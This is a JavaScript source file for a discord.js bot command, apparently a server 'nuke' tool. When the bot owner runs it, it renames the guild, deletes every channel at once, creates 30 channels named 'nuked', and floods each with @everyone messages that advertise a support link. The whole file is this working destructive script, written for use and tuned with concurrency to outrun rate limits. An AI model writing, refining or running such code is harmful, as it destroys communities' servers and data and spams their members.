const { ChannelType, PermissionsBitField } = require("discord.js");
const config = require("../../config");

module.exports = {
  name: "ultra-fast-special", // Renamed command to emphasize speed
  category: "Owner",
  owner: true,

  async execute(message) {
    // START: Fast path setup
    if (message.author.id !== config.ownerID) return;

    const guild = message.guild;
    const SUPPORT = config.links.support;
    const NUM_CHANNELS = 30; 
    const MESSAGE_COUNT = 5; 
    const messageContent = `@everyone\n💣 **Nuked by... Support**\n🔗 **Support:** ${SUPPORT}`;
    
    // Send initial status to the user immediately, without waiting for the Discord API to catch up.
    // This provides immediate feedback but is not strictly necessary for "speed."
    await message.channel.send("⚡ **ULTRA-FAST Nuked script running... Standby.**");

    /* ---------------- 1. INITIAL ACTIONS (Concurrent) ---------------- */
    // Run the guild name change and the initial channel deletion at the same time.
    const initialActions = [
        guild.setName("⚡ ULTRA NUKED").catch(() => null),
        ...guild.channels.cache.map(ch => ch.delete().catch(() => null))
    ];
    await Promise.all(initialActions);

    /* ---------------- 2. CHANNEL CREATION (Concurrent) ---------------- */
    const channelCreationPromises = [];

    // All 30 channels are requested to be created simultaneously.
    for (let i = 0; i < NUM_CHANNELS; i++) {
        channelCreationPromises.push(
            guild.channels.create({
                name: `💣 nuked`,
                type: ChannelType.GuildText,
            })
            .catch(() => null)
        );
    }
    
    // Await all creations, filter out any failed attempts (rate-limits).
    const channels = (await Promise.all(channelCreationPromises)).filter(ch => ch);
    
    /* ---------------- 3. MESSAGE SPAM (Aggressive Concurrent) ---------------- */
    const messagePromises = [];

    // For each created channel, queue 5 messages for simultaneous sending.
    for (const channel of channels) {
      for (let i = 0; i < MESSAGE_COUNT; i++) {
        messagePromises.push(
            channel.send(messageContent).catch(() => null)
        );
      }
    }
    
    // Await all 150 (max) messages to be sent. This is the bottleneck.
    await Promise.all(messagePromises);

    // END: Final confirmation
    await message.channel.send("✅ **ULTRA-FAST Nuked operation completed!**");
  },
};
